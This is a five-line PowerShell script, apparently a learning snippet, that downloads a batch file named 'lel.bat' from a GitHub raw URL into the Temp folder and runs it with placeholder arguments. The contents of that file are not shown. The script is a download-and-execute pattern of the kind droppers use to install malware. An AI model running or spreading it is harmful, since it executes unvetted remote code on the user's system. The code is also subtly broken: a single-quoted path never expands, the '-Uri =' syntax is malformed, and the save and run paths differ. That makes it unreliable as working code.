$url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'
$outpath = '$env:Temp\lel.bat'
Invoke-WebRequest -Uri = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat' -OutFile $outpath
$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$env:Temp/lel.bat" -ArgumentList $args
